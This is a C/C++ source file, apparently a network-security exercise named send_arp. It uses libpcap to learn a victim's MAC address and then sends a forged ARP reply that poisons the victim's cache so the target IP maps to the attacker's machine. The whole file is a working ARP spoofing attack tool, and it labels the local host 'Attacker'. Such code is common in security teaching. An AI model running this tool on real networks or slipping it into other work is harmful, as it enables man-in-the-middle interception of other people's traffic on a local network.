#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <libnet.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <pcap.h>
#include "my_arp.h"

typedef struct _MyInfo {
    uint8_t my_mac[6];
    uint8_t my_ip[4];
} MyInfo;

static char *dev;
static char *sender_ip;
static char *target_ip;
static MyInfo *my_info;
static uint8_t sender_mac[6];

void get_myinfo(MyInfo *my_info);
void print_mac(const u_char *mac);
void print_ip(const u_char *ip);
void print_packet(const u_char *packet, int len);

void arp_request(pcap_t *fp);
void arp_reply(pcap_t *fp);
void arp_spoofing(pcap_t *fp);

int main(int argc, char* argv[]) {
    pcap_t *fp;
    char errbuf[PCAP_ERRBUF_SIZE];
    my_info = reinterpret_cast<MyInfo *>(malloc(sizeof(MyInfo)));

    if(argc < 4) {
        printf("Usage: ./send_arp <interface> <sender ip> <target ip>\n");
        return -1;
    }
    else {
        dev = argv[1];
        sender_ip = argv[2];
        target_ip = argv[3];
    }

    get_myinfo(my_info);
    printf("[*] Attacker ");
    print_mac(my_info->my_mac);
    printf("[*] Attacker ");
    print_ip(my_info->my_ip);

    if((fp = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf)) == nullptr) {
        fprintf(stderr, "Couldn't open device %s \n", errbuf);
        return -1;
    }

    arp_request(fp);
    arp_reply(fp);
    arp_spoofing(fp);

    pcap_close(fp);
}

void get_myinfo(MyInfo *my_info) {
    struct ifreq info;
    int sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(info.ifr_name, dev);
    ioctl(sock, SIOCGIFHWADDR, &info);
    for (int i = 0; i < 6; i++)
        my_info->my_mac[i] = static_cast<unsigned char>(info.ifr_ifru.ifru_hwaddr.sa_data[i]);

    ioctl(sock, SIOCGIFADDR, &info);
    for (int i = 2; i < 6; ++i) {
        my_info->my_ip[i-2] = static_cast<unsigned char>(info.ifr_ifru.ifru_addr.sa_data[i]);
    }
    close(sock);
}

void print_mac(const u_char *mac) {
    printf("Mac = ");
    for(int i = 0; i < 6; i++) {
        if(i < 5) printf("%02x:", mac[i]);
        else printf("%02x", mac[i]);
    }
    printf("\n");
}

void print_ip(const u_char *ip) {
    printf("IP = ");
    for(int i = 0; i < 4; i++) {
        if(i < 3) printf("%d.", ip[i]);
        else printf("%d", ip[i]);
    }
    printf("\n");
}

void print_packet(const u_char *packet, int len) {
    printf("================================================\n");
    for(int i = 1; i <= len; i++) {
        printf("%02X ", packet[i-1]);
        if(i % 8 == 0) printf(" ");
        if(i % 16 == 0) printf("\n");
    }
    printf("\n================================================\n");
}

void arp_request(pcap_t *fp) {
    struct libnet_ethernet_hdr *ether_hdr = reinterpret_cast<libnet_ethernet_hdr *>(malloc(sizeof(libnet_ethernet_hdr)));
    struct my_arp_hdr *arp_hdr = reinterpret_cast<my_arp_hdr *>(malloc(sizeof(my_arp_hdr)));
    struct in_addr addr;
    u_char packet[sizeof(struct libnet_ethernet_hdr) + sizeof(struct my_arp_hdr)];

    memset(ether_hdr, 0, sizeof(libnet_ethernet_hdr));
    memset(arp_hdr, 0, sizeof(my_arp_hdr));

    /* set ether_hdr */
    memset(ether_hdr->ether_dhost, 0xff, ETHER_ADDR_LEN);
    memcpy(ether_hdr->ether_shost, my_info->my_mac, ETHER_ADDR_LEN);
    ether_hdr->ether_type = htons(ETHERTYPE_ARP);

    /* set arp_hdr */
    arp_hdr->ar_hrd = htons(ARPHRD_ETHER);                   /* format of hardware address */
    arp_hdr->ar_pro = htons(ETHERTYPE_IP);                   /* format of protocol address */
    arp_hdr->ar_hln = MAC_LEN;                               /* length of hardware address */
    arp_hdr->ar_pln = IP_LEN;                                /* length of protocol addres */
    memcpy(arp_hdr->ar_sha, my_info->my_mac, MAC_LEN);
    memcpy(arp_hdr->ar_spa, &(my_info->my_ip), IP_LEN);
    memset(arp_hdr->ar_tha, 0x00, MAC_LEN);
    inet_pton(AF_INET, sender_ip, &addr);
    memcpy(arp_hdr->ar_tpa, &addr, IP_LEN);
    arp_hdr->ar_op = htons(ARPOP_REQUEST);

    memcpy(packet, ether_hdr, sizeof(struct libnet_ethernet_hdr));
    memcpy(packet + sizeof(struct libnet_ethernet_hdr), arp_hdr, sizeof(struct my_arp_hdr));

    printf("================================================\n");
    printf("                  ARP_REQUEST                   \n");
    print_packet(packet, sizeof(packet));

    if (pcap_sendpacket(fp, packet, sizeof(packet)) == -1) {
        fprintf(stderr, "pcap_sendpacket: %s", pcap_geterr(fp));
        return;
    }
}

void arp_reply(pcap_t *fp) {
    const struct my_arp_hdr *arp_hdr;
    struct pcap_pkthdr *pkthdr;
    const u_char *packet;
    int res = 0;

    while((res = pcap_next_ex(fp, &pkthdr, &packet)) == 0) {
        if(res == -1) {
            printf("Corrupted input file.\n");
            return;
        }
    }

    printf("================================================\n");
    printf("                   ARP_REPLY                    \n");
    print_packet(packet, 42);

    arp_hdr = reinterpret_cast<const my_arp_hdr*>(packet + sizeof(libnet_ethernet_hdr));

    printf("[*] Sender ");
    print_mac(arp_hdr->ar_sha);

    for (int i = 0; i < 6; i++)
        sender_mac[i] = arp_hdr->ar_sha[i];
}

void arp_spoofing(pcap_t *fp) {
    struct libnet_ethernet_hdr *ether_hdr = reinterpret_cast<libnet_ethernet_hdr *>(malloc(sizeof(libnet_ethernet_hdr)));
    struct my_arp_hdr *arp_hdr = reinterpret_cast<my_arp_hdr *>(malloc(sizeof(my_arp_hdr)));
    struct in_addr addr1, addr2;
    u_char packet[sizeof(struct libnet_ethernet_hdr) + sizeof(struct my_arp_hdr)];

    memset(ether_hdr, 0, sizeof(libnet_ethernet_hdr));
    memset(arp_hdr, 0, sizeof(my_arp_hdr));

    /* set ether_hdr */
    memcpy(ether_hdr->ether_dhost, sender_mac, ETHER_ADDR_LEN);
    memcpy(ether_hdr->ether_shost, my_info->my_mac, ETHER_ADDR_LEN);
    ether_hdr->ether_type = htons(ETHERTYPE_ARP);

    /* set arp_hdr */
    arp_hdr->ar_hrd = htons(ARPHRD_ETHER);                   /* format of hardware address */
    arp_hdr->ar_pro = htons(ETHERTYPE_IP);                   /* format of protocol address */
    arp_hdr->ar_hln = MAC_LEN;                               /* length of hardware address */
    arp_hdr->ar_pln = IP_LEN;                                /* length of protocol addres */
    memcpy(arp_hdr->ar_sha, my_info->my_mac, MAC_LEN);
    inet_pton(AF_INET, target_ip, &addr1);
    memcpy(arp_hdr->ar_spa, &addr1, IP_LEN);
    memcpy(arp_hdr->ar_tha, sender_mac, MAC_LEN);
    inet_pton(AF_INET, sender_ip, &addr2);
    memcpy(arp_hdr->ar_tpa, &addr2, IP_LEN);
    arp_hdr->ar_op = htons(ARPOP_REPLY);

    memcpy(packet, ether_hdr, sizeof(struct libnet_ethernet_hdr));
    memcpy(packet + sizeof(struct libnet_ethernet_hdr), arp_hdr, sizeof(struct my_arp_hdr));

    printf("================================================\n");
    printf("                  ARP_SPOOFING                  \n");
    print_packet(packet, sizeof(packet));

    if (pcap_sendpacket(fp, packet, sizeof(packet)) == -1) {
        fprintf(stderr, "pcap_sendpacket: %s", pcap_geterr(fp));
        return;
    }
}
